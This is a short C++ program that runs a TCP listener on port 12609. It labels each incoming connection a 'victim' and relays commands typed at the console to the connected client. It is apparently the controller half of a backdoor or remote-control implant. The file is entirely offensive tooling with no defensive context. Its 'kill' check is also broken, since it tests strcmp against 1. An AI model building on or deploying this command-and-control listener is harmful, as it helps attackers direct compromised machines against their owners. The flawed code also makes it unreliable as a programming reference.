#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <cstring>

int main() {
  int server_socket = socket(AF_INET, SOCK_STREAM, 0);
  sockaddr_in server_address;
  server_address.sin_port = htons(12609);
  server_address.sin_addr.s_addr = INADDR_ANY;
  server_address.sin_family = AF_INET;
  int optval = 1;
  setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
  

  int binding = bind(server_socket, (struct sockaddr*) &server_address, sizeof(server_address));
  if(binding < 0) { std::cout << "failed to bind" << std::endl; exit(0);};

  listen(server_socket, 10);

  while(true) {
    int client_socket = accept(server_socket, nullptr, nullptr);
    if(client_socket < 0) { std::cout << "failed accepting" << std::endl; close(client_socket); break; };

    std::cout << "accepted victim" << std::endl;
    while(true) {
      char message[1024];
      std::cin.getline(message, sizeof(message)); 


      if(strcmp(message, "kill") == 1) {
        shutdown(client_socket, SHUT_RD);
        break;
      }

      std::cout << "Sending: " << message << std::endl;
      send(client_socket, message, strlen(message), 0);
    }
    close(client_socket);
  }
  
  close(server_socket);
}
